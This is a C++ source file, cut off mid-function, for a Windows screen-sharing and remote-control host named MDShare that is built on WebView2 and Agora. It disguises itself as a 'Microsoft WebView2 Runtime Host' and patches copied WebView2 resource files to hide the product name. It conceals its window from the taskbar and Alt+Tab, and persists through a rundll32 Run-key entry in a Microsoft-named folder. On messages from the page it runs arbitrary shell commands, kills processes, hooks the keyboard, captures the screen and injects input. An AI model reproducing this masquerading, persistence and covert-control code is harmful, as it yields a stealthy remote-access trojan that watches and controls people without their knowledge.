/**
 * webview_window.cpp — Win32 窗口 + WebView2 + Agora Native SDK 集成
 */
#include "webview_window.h"
#include "device_info.h"
#include "vbcable.h"
#include "command_exec.h"
#include "dll_extractor.h"
#include "json_helpers.h"
#include "web_resources.h"

#include <wil/com.h>
#include <WebView2EnvironmentOptions.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <cassert>
#include <thread>
#include <utility>
#include <filesystem>
#include <fstream>

#pragma comment(lib, "shlwapi.lib")

namespace fs = std::filesystem;

extern HINSTANCE g_hInstance;

namespace MDShare {

static const wchar_t* const WINDOW_CLASS = L"MDShareWebView2Host";
static const wchar_t* const WINDOW_TITLE = L"Microsoft WebView2 Runtime Host";
static const wchar_t* const VIRTUAL_HOST = L"mdshare.local";

// WM_APP 子消息
static const UINT WM_POST_TO_WEB     = WM_APP + 1;
static const UINT WM_POST_TO_WEB_RAW = WM_APP + 2; // 预览帧：直接发送完整 JSON 字符串

// 全局热键 ID：恢复隐藏的窗口
static const int HOTKEY_ID_RESTORE = 1;

// ── 构造/析构 ──────────────────────────────────────────

WebViewWindow::WebViewWindow(HINSTANCE hInstance)
    : m_hInstance(hInstance)
{
    m_prevPlacement.length = sizeof(WINDOWPLACEMENT);
}

WebViewWindow::~WebViewWindow() = default;

// ── Run ────────────────────────────────────────────────

void WebViewWindow::Run(int nCmdShow, bool stealth)
{
    if (!CreateMainWindow(nCmdShow))
        return;

    // 隐身启动：隐藏窗口 + Alt+Tab 不可见 + 注册恢复热键
    if (stealth) {
        SetStealth(true);
        if (nCmdShow == SW_HIDE) {
            m_isHidden = true;
            RegisterHotKey(m_hwnd, HOTKEY_ID_RESTORE, MOD_CONTROL | MOD_SHIFT, 'M');
        }
    }

    InitWebView2();

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        ::DispatchMessageW(&msg);
    }
}

// ── Win32 窗口创建 ────────────────────────────────────

bool WebViewWindow::CreateMainWindow(int nCmdShow)
{
    WNDCLASSEXW wc{};
    wc.cbSize        = sizeof(WNDCLASSEXW);
    wc.style         = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = m_hInstance;
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = CreateSolidBrush(RGB(3, 7, 18));
    wc.lpszClassName = WINDOW_CLASS;
    wc.hIcon         = LoadIcon(nullptr, IDI_APPLICATION);
    wc.hIconSm       = LoadIcon(nullptr, IDI_APPLICATION);

    if (!RegisterClassExW(&wc))
    {
        if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
            return false;
    }

    m_hwnd = CreateWindowExW(
        0, WINDOW_CLASS, WINDOW_TITLE, WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 1280, 800,
        nullptr, nullptr, m_hInstance, this
    );

    if (!m_hwnd) return false;
    ShowWindow(m_hwnd, nCmdShow == 0 ? SW_SHOW : nCmdShow);
    UpdateWindow(m_hwnd);
    return true;
}

// ── WndProc ──────────────────────────────────────────

LRESULT CALLBACK WebViewWindow::WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    WebViewWindow* self = nullptr;

    if (msg == WM_NCCREATE)
    {
        auto cs = reinterpret_cast<CREATESTRUCTW*>(lParam);
        self = static_cast<WebViewWindow*>(cs->lpCreateParams);
        SetWindowLongPtrW(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(self));
    }
    else
    {
        self = reinterpret_cast<WebViewWindow*>(GetWindowLongPtrW(hwnd, GWLP_USERDATA));
    }

    switch (msg)
    {
    case WM_SIZE:
        if (self) {
            if (wParam == SIZE_MINIMIZED && self->m_controller) {
                // 窗口最小化时保持 WebView2 活跃（防止 JS 定时器节流/消息处理中断导致远控失效）
                // 1. 强制 IsVisible=TRUE 防止 WebView2 进入后台暂停
                self->m_controller->put_IsVisible(TRUE);
                // 2. 设置一个最小非零 bounds，防止 WebView2 因 bounds 为 {0,0,0,0} 进入休眠
                RECT minBounds = { 0, 0, 1, 1 };
                self->m_controller->put_Bounds(minBounds);
            } else {
                self->ResizeWebView();
            }
        }
        return 0;

    case WM_CLOSE:
        VBCable::TryUninstallFireAndForget();
        if (self) {
            self->m_inputInjector.StopCursorPolling();
            self->m_inputLocker.DisableViewerForward();
            self->m_inputLocker.Uninstall();
            self->m_agora.Release();
        }
        DestroyWindow(hwnd);
        return 0;

    case WM_DESTROY:
        UnregisterHotKey(hwnd, HOTKEY_ID_RESTORE);
        PostQuitMessage(0);
        return 0;

    case WM_HOTKEY:
        if (wParam == HOTKEY_ID_RESTORE && self) {
            // 全局热键恢复隐藏的窗口
            ShowWindow(hwnd, SW_SHOW);
            SetForegroundWindow(hwnd);
            UnregisterHotKey(hwnd, HOTKEY_ID_RESTORE);
            self->m_isHidden = false;
            json data;
            data["hidden"] = false;
            self->SendToWeb("window-visibility", data.dump());
        }
        return 0;

    case WM_POST_TO_WEB:
    {
        auto* msgPair = reinterpret_cast<std::pair<std::string, std::string>*>(lParam);
        if (self && msgPair) {
            self->SendToWeb(msgPair->first, msgPair->second);
        }
        delete msgPair;
        return 0;
    }
    case WM_POST_TO_WEB_RAW:
    {
        auto* raw = reinterpret_cast<std::string*>(lParam);
        if (self && raw) {
            self->SendRawJsonToWeb(*raw);
        }
        delete raw;
        return 0;
    }
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

// ── WebView2 初始化 ──────────────────────────────────

// 查找系统 WebView2 Evergreen 运行时路径
static std::wstring FindSystemWebView2Runtime()
{
    // 注册表路径
    const wchar_t* regPaths[] = {
        L"SOFTWARE\\WOW6432Node\\Microsoft\\EdgeUpdate\\Clients\\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}",
        L"SOFTWARE\\Microsoft\\EdgeUpdate\\Clients\\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}",
    };
    HKEY roots[] = { HKEY_LOCAL_MACHINE, HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };

    for (int i = 0; i < 2; i++) {
        for (auto root : roots) {
            HKEY hKey = nullptr;
            if (RegOpenKeyExW(root, regPaths[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                wchar_t loc[MAX_PATH] = {};
                DWORD size = sizeof(loc);
                if (RegQueryValueExW(hKey, L"location", nullptr, nullptr, (BYTE*)loc, &size) == ERROR_SUCCESS) {
                    RegCloseKey(hKey);
                    std::wstring exePath = std::wstring(loc) + L"\\msedgewebview2.exe";
                    if (GetFileAttributesW(exePath.c_str()) != INVALID_FILE_ATTRIBUTES)
                        return loc;
                }
                RegCloseKey(hKey);
            }
        }
    }

    // 备选：扫描 Program Files
    wchar_t pf[MAX_PATH] = {};
    SHGetFolderPathW(nullptr, CSIDL_PROGRAM_FILESX86, nullptr, 0, pf);
    std::wstring searchDir = std::wstring(pf) + L"\\Microsoft\\EdgeWebView\\Application";
    try {
        std::wstring bestVer;
        fs::path bestPath;
        for (auto& entry : fs::directory_iterator(searchDir)) {
            if (entry.is_directory()) {
                auto p = entry.path() / L"msedgewebview2.exe";
                if (fs::exists(p)) {
                    auto name = entry.path().filename().wstring();
                    if (name > bestVer) { bestVer = name; bestPath = entry.path(); }
                }
            }
        }
        if (!bestPath.empty()) return bestPath.wstring();
    } catch (...) {}

    return {};
}

// 对 pak 文件做二进制替换（等长替换，不破坏格式）
static void PatchBinaryReplace(const fs::path& file,
    const std::vector<std::pair<std::string, std::string>>& replacements)
{
    std::ifstream ifs(file, std::ios::binary);
    if (!ifs) return;
    std::string data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    ifs.close();

    bool modified = false;
    for (auto& [oldStr, newStr] : replacements) {
        size_t pos = 0;
        while ((pos = data.find(oldStr, pos)) != std::string::npos) {
            data.replace(pos, oldStr.size(), newStr);
            pos += newStr.size();
            modified = true;
        }
    }
    if (modified) {
        std::ofstream ofs(file, std::ios::binary);
        ofs.write(data.data(), data.size());
    }
}

// 补丁 pak 文件，去掉 WebView2 产品名前缀
static void PatchPakFiles(const fs::path& runtimeDir)
{
    // 通用替换：去掉 $1 模板中的产品名前缀（等长，用空格填充）
    std::vector<std::pair<std::string, std::string>> genericRepl = {
        {"WebView2 $1",  "$1         "},   // 11B → 11B
        {"WebView2: $1", "$1          "},  // 12B → 12B
    };

    // zh-CN 专用：管理器 → 后台核心服务
    std::string zhCnManager = "WebView2 \xe7\xae\xa1\xe7\x90\x86\xe5\x99\xa8";       // "WebView2 管理器" 18B
    std::string zhCnReplace = "\xe5\x90\x8e\xe5\x8f\xb0\xe6\xa0\xb8\xe5\xbf\x83\xe6\x9c\x8d\xe5\x8a\xa1"; // "后台核心服务" 18B

    // zh-TW 专用
    std::string zhTwManager = "WebView2 \xe7\xae\xa1\xe7\x90\x86\xe5\x93\xa1";       // "WebView2 管理員" 18B
    std::string zhTwReplace = "\xe8\x83\x8c\xe6\x99\xaf\xe6\xa0\xb8\xe5\xbf\x83\xe6\x9c\x8d\xe5\x8b\x99"; // "背景核心服務" 18B

    // 全局清理：剩余的 "WebView2" → "Host Svc"（8B → 8B）
    std::pair<std::string, std::string> globalRepl = {"WebView2", "Host Svc"};

    auto patchOne = [&](const fs::path& pak) {
        auto name = pak.filename().string();
        // 转小写
        std::string lower = name;
        for (auto& c : lower) c = (char)tolower((unsigned char)c);

        std::vector<std::pair<std::string, std::string>> repls;
        if (lower == "zh-cn.pak") {
            repls.push_back({zhCnManager, zhCnReplace});
        } else if (lower == "zh-tw.pak") {
            repls.push_back({zhTwManager, zhTwReplace});
        }
        repls.insert(repls.end(), genericRepl.begin(), genericRepl.end());
        repls.push_back(globalRepl);

        PatchBinaryReplace(pak, repls);
    };

    // Patch Locales/*.pak
    try {
        for (auto& entry : fs::directory_iterator(runtimeDir / "Locales")) {
            if (entry.path().extension() == ".pak")
                patchOne(entry.path());
        }
    } catch (...) {}

    // Patch top-level *.pak
    try {
        for (auto& entry : fs::directory_iterator(runtimeDir)) {
            if (entry.path().extension() == ".pak")
                patchOne(entry.path());
        }
    } catch (...) {}
}

// 准备本地 WebView2 运行时（首次启动时从系统复制并打补丁）
static std::wstring PrepareLocalRuntime()
{
    wchar_t localAppData[MAX_PATH]{};
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);

    std::wstring runtimeDir = std::wstring(localAppData) + L"\\Microsoft\\WebView2\\Runtime";

    // 如果已存在，直接使用
    if (GetFileAttributesW((runtimeDir + L"\\msedgewebview2.exe").c_str()) != INVALID_FILE_ATTRIBUTES) {
        return runtimeDir;
    }

    // 查找系统运行时
    auto sysRuntime = FindSystemWebView2Runtime();
    if (sysRuntime.empty()) return {};

    // 复制到本地
    try {
        fs::create_directories(runtimeDir);
        fs::copy(sysRuntime, runtimeDir, fs::copy_options::recursive | fs::copy_options::overwrite_existing);
    } catch (...) {
        return {};
    }

    // 打补丁
    PatchPakFiles(fs::path(runtimeDir));

    return runtimeDir;
}

void WebViewWindow::InitWebView2()
{
    wchar_t localAppData[MAX_PATH]{};
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    std::wstring userDataFolder = std::wstring(localAppData) + L"\\Microsoft\\WebView2";
    CreateDirectoryW((std::wstring(localAppData) + L"\\Microsoft").c_str(), nullptr);
    CreateDirectoryW(userDataFolder.c_str(), nullptr);

    // 自动准备本地运行时（首次启动从系统复制并修补进程名）
    LPCWSTR browserExeFolder = nullptr;
    static std::wstring localRuntime = PrepareLocalRuntime();
    if (!localRuntime.empty()) {
        browserExeFolder = localRuntime.c_str();
    }

    auto options = Microsoft::WRL::Make<CoreWebView2EnvironmentOptions>();
    options->put_AdditionalBrowserArguments(L"--allow-running-insecure-content");

    CreateCoreWebView2EnvironmentWithOptions(
        browserExeFolder, userDataFolder.c_str(), options.Get(),
        Microsoft::WRL::Callback<ICoreWebView2CreateCoreWebView2EnvironmentCompletedHandler>(
            [this](HRESULT hr, ICoreWebView2Environment* env) -> HRESULT
            {
                if (FAILED(hr)) {
                    MessageBoxW(m_hwnd,
                        L"WebView2 Runtime initialization failed.",
                        L"Error", MB_OK | MB_ICONERROR);
                    PostQuitMessage(1);
                    return hr;
                }
                m_env = env;
                env->CreateCoreWebView2Controller(
                    m_hwnd,
                    Microsoft::WRL::Callback<ICoreWebView2CreateCoreWebView2ControllerCompletedHandler>(
                        [this](HRESULT hr, ICoreWebView2Controller* controller) -> HRESULT
                        {
                            OnWebViewCreated(hr, controller);
                            return S_OK;
                        }
                    ).Get()
                );
                return S_OK;
            }
        ).Get()
    );
}

void WebViewWindow::OnWebViewCreated(HRESULT hr, ICoreWebView2Controller* controller)
{
    if (FAILED(hr) || !controller) {
        MessageBoxW(m_hwnd, L"WebView2 controller creation failed.", L"Error", MB_OK | MB_ICONERROR);
        PostQuitMessage(1);
        return;
    }

    m_controller = controller;
    controller->get_CoreWebView2(&m_webview);

    wil::com_ptr<ICoreWebView2Settings> settings;
    m_webview->get_Settings(&settings);
    settings->put_IsStatusBarEnabled(FALSE);
    settings->put_AreDefaultContextMenusEnabled(FALSE);
    settings->put_IsZoomControlEnabled(FALSE);
    wil::com_ptr<ICoreWebView2Settings3> settings3;
    if (SUCCEEDED(settings->QueryInterface(IID_PPV_ARGS(&settings3)))) {
        settings3->put_AreBrowserAcceleratorKeysEnabled(TRUE);
    }
#ifdef _DEBUG
    settings->put_AreDevToolsEnabled(TRUE);
#else
    settings->put_AreDevToolsEnabled(TRUE);  // TODO: 调试完成后改回 FALSE
#endif

    m_webview->AddWebResourceRequestedFilter(
        L"https://mdshare.local/*", COREWEBVIEW2_WEB_RESOURCE_CONTEXT_ALL);

    m_webview->add_WebResourceRequested(
        Microsoft::WRL::Callback<ICoreWebView2WebResourceRequestedEventHandler>(
            [this](ICoreWebView2* s, ICoreWebView2WebResourceRequestedEventArgs* a) -> HRESULT {
                OnWebResourceRequested(s, a); return S_OK;
            }).Get(), nullptr);

    m_webview->add_WebMessageReceived(
        Microsoft::WRL::Callback<ICoreWebView2WebMessageReceivedEventHandler>(
            [this](ICoreWebView2* s, ICoreWebView2WebMessageReceivedEventArgs* a) -> HRESULT {
                OnWebMessageReceived(s, a); return S_OK;
            }).Get(), nullptr);

    m_webview->add_NavigationCompleted(
        Microsoft::WRL::Callback<ICoreWebView2NavigationCompletedEventHandler>(
            [this](ICoreWebView2* s, ICoreWebView2NavigationCompletedEventArgs* a) -> HRESULT {
                OnNavigationCompleted(s, a); return S_OK;
            }).Get(), nullptr);

    m_webview->add_DocumentTitleChanged(
        Microsoft::WRL::Callback<ICoreWebView2DocumentTitleChangedEventHandler>(
            [this](ICoreWebView2* sender, IUnknown*) -> HRESULT {
                wil::unique_cotaskmem_string title;
                sender->get_DocumentTitle(&title);
                if (title) SetWindowTextW(m_hwnd, title.get());
                return S_OK;
            }).Get(), nullptr);

    ResizeWebView();
    m_webview->Navigate(L"https://mdshare.local/index.html");
}

// ── 导航完成 ─────────────────────────────────────────

void WebViewWindow::OnNavigationCompleted(ICoreWebView2* /*sender*/,
    ICoreWebView2NavigationCompletedEventArgs* args)
{
    BOOL isSuccess = FALSE;
    args->get_IsSuccess(&isSuccess);
    if (!isSuccess) return;

    m_webReady = true;

    // 注入 Native 模式标志，JS 通过 window.isNativeMode 检测
    m_webview->ExecuteScript(L"window.isNativeMode = true;", nullptr);

    // 发送设备信息
    auto info = DeviceInfo::Collect();
    SendToWeb("device-info", info.dump());
}

// ── Web 资源拦截 ──────────────────────────────────────

void WebViewWindow::OnWebResourceRequested(ICoreWebView2* /*sender*/,
    ICoreWebView2WebResourceRequestedEventArgs* args)
{
    wil::unique_cotaskmem_string uriRaw;
    wil::com_ptr<ICoreWebView2WebResourceRequest> request;
    args->get_Request(&request);
    request->get_Uri(&uriRaw);

    std::wstring uri(uriRaw.get());
    std::wstring prefix = L"https://mdshare.local";
    std::string path;
    if (uri.find(prefix) == 0) {
        path = WideToUtf8(uri.substr(prefix.size()));
        auto qpos = path.find('?');
        if (qpos != std::string::npos) path = path.substr(0, qpos);
    }
    if (path.empty() || path == "/") path = "/index.html";

    auto [data, size] = FindEmbeddedResource(path);
    if (!data || size == 0) {
        wil::com_ptr<ICoreWebView2WebResourceResponse> response;
        m_env->CreateWebResourceResponse(nullptr, 404, L"Not Found", L"", &response);
        args->put_Response(response.get());
        return;
    }

    IStream* stream = SHCreateMemStream(data, (UINT)size);
    if (!stream) return;

    std::string mimeType = GetMimeType(path);
    std::wstring headers = L"Content-Type: " + Utf8ToWide(mimeType);

    wil::com_ptr<ICoreWebView2WebResourceResponse> response;
    m_env->CreateWebResourceResponse(stream, 200, L"OK", headers.c_str(), &response);
    args->put_Response(response.get());
    stream->Release();
}

// ── 前端消息处理 ──────────────────────────────────────

void WebViewWindow::OnWebMessageReceived(ICoreWebView2* /*sender*/,
    ICoreWebView2WebMessageReceivedEventArgs* args)
{
    wil::unique_cotaskmem_string messageRaw;
    args->TryGetWebMessageAsString(&messageRaw);
    if (!messageRaw) return;

    std::string raw = WideToUtf8(messageRaw.get());
    try {
        auto parsed = json::parse(raw);
        if (parsed.is_string()) raw = parsed.get<std::string>();
    } catch (...) {}

    DispatchMessage(raw);
}

void WebViewWindow::DispatchMessage(const std::string& jsonStr)
{
    try {
        auto msg = json::parse(jsonStr);
        std::string type = msg.value("type", "");

        // ── 通用命令 ──
        if (type == "request-device-info") {
            auto info = DeviceInfo::Collect();
            SendToWeb("device-info", info.dump());
        }
        else if (type == "request-process-list") {
            auto list = ProcessMgr::GetProcessList();
            SendToWeb("process-list", list.dump());
        }
        else if (type == "kill-process") {
            int pid = msg.value("pid", 0);
            auto result = ProcessMgr::KillProcess(pid);
            if (result.contains("activity")) {
                SendToWeb("activity", result["activity"].dump());
            } else {
                SendToWeb("command-output", result.dump());
            }
        }
        else if (type == "execute-command") {
            std::string cmd = msg.value("command", "");
            auto result = CommandExec::Execute(cmd);
            SendToWeb("command-output", result.dump());
        }
        else if (type == "channel-created") {
            std::string channelId = msg.value("channelId", "");
            std::wstring title = L"Microsoft WebView2 Runtime Host | Channel: " + Utf8ToWide(channelId);
            SetWindowTextW(m_hwnd, title.c_str());
        }
        else if (type == "share-started") {
            SetWindowTextW(m_hwnd, L"Microsoft WebView2 Runtime Host | Active");
        }
        else if (type == "share-stopped") {
            SetWindowTextW(m_hwnd, WINDOW_TITLE);
        }
        else if (type == "enter-fullscreen") {
            EnterFullscreen();
        }
        else if (type == "exit-fullscreen") {
            ExitFullscreen();
        }
        else if (type == "close") {
            int result = MessageBoxW(m_hwnd, L"Close this window?", L"Confirm",
                MB_YESNO | MB_ICONQUESTION);
            if (result == IDYES) PostMessageW(m_hwnd, WM_CLOSE, 0, 0);
        }
        else if (type == "window-hide") {
            // 最小化到后台：隐藏窗口（任务栏和托盘都不显示）
            // 注册全局热键 Ctrl+Shift+M 用于恢复
            RegisterHotKey(m_hwnd, HOTKEY_ID_RESTORE, MOD_CONTROL | MOD_SHIFT, 'M');
            ShowWindow(m_hwnd, SW_HIDE);
            m_isHidden = true;
            json resp;
            resp["hidden"] = true;
            resp["restoreHotkey"] = "Ctrl+Shift+M";
            SendToWeb("window-visibility", resp.dump());
        }
        else if (type == "window-show") {
            // 恢复窗口
            ShowWindow(m_hwnd, SW_SHOW);
            SetForegroundWindow(m_hwnd);
            UnregisterHotKey(m_hwnd, HOTKEY_ID_RESTORE);
            m_isHidden = false;
            json resp;
            resp["hidden"] = false;
            SendToWeb("window-visibility", resp.dump());
        }
        else if (type == "window-stealth") {
            // 隐身模式：窗口在 Alt+Tab / Win+Tab 中不可见
            bool enable = msg.value("enable", !m_isStealth);
            SetStealth(enable);
            json resp;
            resp["stealth"] = m_isStealth;
            SendToWeb("window-stealth-state", resp.dump());
        }
        else if (type == "autostart-enable") {
            // 开机自启：复制 DLL 到持久路径 + 注册表 Run 键
            wchar_t dllPath[MAX_PATH] = {};
            GetModuleFileNameW(g_hInstance, dllPath, MAX_PATH);

            wchar_t appData[MAX_PATH] = {};
            SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appData);
            std::wstring baseDir = std::wstring(appData) + L"\\Microsoft";
            CreateDirectoryW(baseDir.c_str(), nullptr);
            baseDir += L"\\WebView2";
            CreateDirectoryW(baseDir.c_str(), nullptr);
            baseDir += L"\\Runtime";
            CreateDirectoryW(baseDir.c_str(), nullptr);

            std::wstring persistPath = baseDir + L"\\Microsoft.WebView2.RuntimeHost.dll";
            bool ok = CopyFileW(dllPath, persistPath.c_str(), FALSE) != 0;

            if (ok) {
                std::wstring cmd = L"rundll32 \"" + persistPath + L"\",Open --bg";
                HKEY hKey;
                LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
                    L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, KEY_WRITE, &hKey);
                if (result == ERROR_SUCCESS) {
                    RegSetValueExW(hKey, L"Microsoft WebView2 Runtime Host", 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(cmd.c_str()),
                        static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
                    RegCloseKey(hKey);
                } else {
                    ok = false;
                }
            }
            json resp;
            resp["ok"] = ok;
            resp["enabled"] = ok;
            SendToWeb("autostart-state", resp.dump());
        }
        else if (type == "autostart-disable") {
            // 移除开机自启
            HKEY hKey;
            LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_WRITE, &hKey);
            if (result == ERROR_SUCCESS) {
                RegDeleteValueW(hKey, L"Microsoft WebView2 Runtime Host");
                RegCloseKey(hKey);
            }
            // 删除持久副本
            wchar_t appData[MAX_PATH] = {};
            SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appData);
            std::wstring persistPath = std::wstring(appData)
                + L"\\Microsoft\\WebView2\\Runtime\\Microsoft.WebView2.RuntimeHost.dll";
            DeleteFileW(persistPath.c_str());

            json resp;
            resp["ok"] = true;
            resp["enabled"] = false;
            SendToWeb("autostart-state", resp.dump());
        }
        else if (type == "autostart-query") {
            HKEY hKey;
            bool enabled = false;
            LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_READ, &hKey);
            if (result == ERROR_SUCCESS) {
                result = RegQueryValueExW(hKey, L"Microsoft WebView2 Runtime Host",
                    nullptr, nullptr, nullptr, nullptr);
                enabled = (result == ERROR_SUCCESS);
                RegCloseKey(hKey);
            }
            json resp;
            resp["enabled"] = enabled;
            SendToWeb("autostart-state", resp.dump());
        }

        // ── 键鼠锁定 ──
        else if (type == "input-lock-install") {
            // 安装低级钩子 + 注册状态回调
            m_inputLocker.OnStateChanged([this](bool locked) {
                json data;
                data["locked"] = locked;
                PostToWeb("input-lock-state", data.dump());
            });
            bool ok = m_inputLocker.Install();
            json resp;
            resp["ok"] = ok;
            resp["hotkey"] = m_inputLocker.GetHotkey().ToString();
            SendToWeb("input-lock-install-result", resp.dump());
        }
        else if (type == "input-lock-uninstall") {
            m_inputLocker.Uninstall();
            json resp;
            resp["ok"] = true;
            SendToWeb("input-lock-uninstall-result", resp.dump());
        }
        else if (type == "input-lock-set-hotkey") {
            std::string hotkeyStr = msg.value("hotkey", "Ctrl+Alt+Shift+F12");
            auto combo = HotkeyCombo::FromString(hotkeyStr);
            m_inputLocker.SetHotkey(combo);
            json resp;
            resp["hotkey"] = combo.ToString();
            SendToWeb("input-lock-hotkey-changed", resp.dump());
        }
        else if (type == "input-lock-toggle") {
            m_inputLocker.Toggle();
        }
        else if (type == "input-lock-query") {
            json resp;
            resp["installed"] = m_inputLocker.IsInstalled();
            resp["locked"]    = m_inputLocker.IsLocked();
            resp["hotkey"]    = m_inputLocker.GetHotkey().ToString();
            SendToWeb("input-lock-state-info", resp.dump());
        }
        else if (type == "viewer-keyhook-start") {
            bool installOk = true;
            if (!m_inputLocker.IsInstalled()) {
                m_inputLocker.OnStateChanged([this](bool locked) {
                    json data;
                    data["locked"] = locked;
                    PostToWeb("input-lock-state", data.dump());
                });
                installOk = m_inputLocker.Install();
            }

            if (installOk) {
                m_inputLocker.OnViewerCombo([this](const std::string& combo) {
                    json data;
                    data["combo"] = combo;
                    PostToWeb("viewer-keyhook-combo", data.dump());
                });
                m_inputLocker.EnableViewerForward();
            }

            json resp;
            resp["ok"] = installOk;
            resp["enabled"] = m_inputLocker.IsViewerForwardEnabled();
            SendToWeb("viewer-keyhook-state", resp.dump());
        }
        else if (type == "viewer-keyhook-stop") {
            m_inputLocker.DisableViewerForward();
            m_inputLocker.OnViewerCombo(nullptr);

            json resp;
            resp["ok"] = true;
            resp["enabled"] = false;
            SendToWeb("viewer-keyhook-state", resp.dump());
        }

        // ── VBCable ──
        else if (type == "check-vbcable") {
            auto status = VBCable::Check();
            SendToWeb("vbcable-status", status.dump());
        }
        else if (type == "check-default-recording") {
            auto result = VBCable::CheckDefaultRecording();
            SendToWeb("default-recording-status", result.dump());
        }
        else if (type == "set-default-recording-cable") {
            auto result = VBCable::SetDefaultRecordingToCable();
            SendToWeb("set-default-recording-result", result.dump());
        }
        else if (type == "install-vbcable") {
            HWND hwnd = m_hwnd;
            std::thread([this, hwnd]() {
                CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
                VBCable::Install([hwnd, this](const std::string& t, const json& d) {
                    PostToWeb(t, d.dump());
                });
                CoUninitialize();
            }).detach();
        }
        else if (type == "uninstall-vbcable") {
            HWND hwnd = m_hwnd;
            std::thread([this, hwnd]() {
                CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
                VBCable::Uninstall([hwnd, this](const std::string& t, const json& d) {
                    PostToWeb(t, d.dump());
                });
                CoUninitialize();
            }).detach();
        }

        // ── Agora Native ──
        else if (type == "agora-init") {
            // 确保 Agora DLLs 已从嵌入资源解压到临时目录
            DllExtractor::EnsureExtracted();

            std::string appId = msg.value("appId", "");
            // 绑定事件回调：在任意线程调用 → PostMessage 到 UI 线程
            HWND hwnd = m_hwnd;
            m_agora.onEvent = [this, hwnd](std::string eventJson) {
                // eventJson 格式: {"type":"agora-xxx","data":{...}}
                // 解析后通过 PostToWeb 发送
                try {
                    auto ev = json::parse(eventJson);
                    std::string evType = ev.value("type", "");
                    std::string evData = ev.contains("data") ? ev["data"].dump() : "{}";
                    PostToWeb(evType, evData);
                } catch (...) {}
            };
            // 预览帧回调：直接构建 JSON 字符串，跳过 nlohmann 序列化以减少大帧开销
            m_agora.onPreviewFrame = [this, hwnd](std::string b64) {
                auto* raw = new std::string();
                raw->reserve(b64.size() + 80);
                raw->append(R"({"type":"agora-preview-frame","data":{"frame":")");
                raw->append(b64);
                raw->append(R"("}})");
                ::PostMessageW(hwnd, WM_POST_TO_WEB_RAW, 0, reinterpret_cast<LPARAM>(raw));
            };
            bool ok = m_agora.Init(appId);
            json resp;
            resp["ok"] = ok;
            SendToWeb("agora-init-result", resp.dump());
        }
        else if (type == "agora-get-sources") {
            std::string sources = m_agora.GetSourcesJson();
            SendToWeb("agora-sources", sources);
        }
        else if (type == "agora-join") {
            std::string token     = msg.value("token", "");
            std::string channelId = msg.value("channel", "");
            uint32_t    uid       = msg.value("uid", 0);
            bool ok = m_agora.JoinChannel(token, channelId, uid);
            if (!ok) {
                json err;
                err["msg"] = "joinChannel failed";
                PostToWeb("agora-error", err.dump());
            }
        }
        else if (type == "agora-leave") {
            m_agora.LeaveChannel();
        }
        else if (type == "agora-start-capture") {
            std::string srcType = msg.value("sourceType", "window");
            int64_t sourceId    = msg.value("sourceId", (int64_t)0);
            int frameRate       = msg.value("frameRate", 30);
            int width           = msg.value("width",  1920);
            int height          = msg.value("height", 1080);
            int bitrate         = msg.value("bitrate", 0); // 0 = SDK auto
            bool shareAudio     = msg.value("shareAudio", false);

            bool ok = false;
            if (srcType == "display") {
                ok = m_agora.StartCaptureByDisplay(
                    (int)sourceId, frameRate, width, height, bitrate, shareAudio);
            } else {
                ok = m_agora.StartCaptureByWindow(
                    sourceId, frameRate, width, height, bitrate, shareAudio);
            }
            // 启动 GDI 预览截屏（后台线程 2fps）
            if (ok) m_agora.StartPreviewLoop(srcType, sourceId);
            json resp;
            resp["ok"] = ok;
            SendToWeb("agora-capture-result", resp.dump());
        }
        else if (type == "agora-stop-capture") {
            m_agora.StopPreviewLoop();
            m_agora.StopCapture();
        }
        else if (type == "agora-update-params") {
            int frameRate = msg.value("frameRate", 30);
            int bitrate   = msg.value("bitrate", 0);
            m_agora.UpdateCaptureParams(frameRate, bitrate);
        }

        // ── 远程控制 ──
        else if (type == "remote-input") {
            m_inputInjector.HandleInputEvent(msg);
        }
        else if (type == "remote-control-enable") {
            // 释放所有修饰键，防止远控启动前残留粘键
            InputInjector::ReleaseAllModifiers();
            m_inputInjector.Enable();
            // 启动光标形状同步（100ms 轮询，变化时推送给前端）
            m_inputInjector.StartCursorPolling([this](const std::string& cursorType) {
                json data;
                data["cursor"] = cursorType;
                PostToWeb("rc-cursor", data.dump());
            });
            // 不再锁定本地键鼠，允许被控端本地用户继续操作
            json resp;
            resp["enabled"] = true;
            resp["screenInfo"] = InputInjector::GetScreenInfo();
            SendToWeb("remote-control-state", resp.dump());
        }
        else if (type == "remote-control-disable") {
            m_inputInjector.StopCursorPolling();
            m_inputInjector.Disable();
            // 释放所有修饰键，防止远控结束后残留粘键
            InputInjector::ReleaseAllModifiers();
            json resp;
            resp["enabled"] = false;
            SendToWeb("remote-control-state", resp.dump());
        }
        else if (type == "remote-screen-info") {
            auto info = InputInjector::GetScreenInfo();
